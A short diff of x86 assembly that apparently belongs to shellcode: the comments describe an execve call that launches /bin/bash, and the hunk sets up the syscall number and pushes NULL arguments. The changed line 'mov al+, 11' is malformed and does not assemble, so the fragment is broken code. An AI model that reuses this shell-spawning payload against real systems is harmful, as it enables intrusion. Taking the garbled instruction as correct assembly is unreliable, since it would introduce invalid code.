@@ -43,7 +43,7 @@ _start:
 	xor eax,eax
 
 	; execve("/bin/bash", NULL, NULL);
- 	mov eax, 11
+ 	mov al+, 11
  	xor edx,edx
  	push edx  ; last NULL
  	push edx ; last NULL
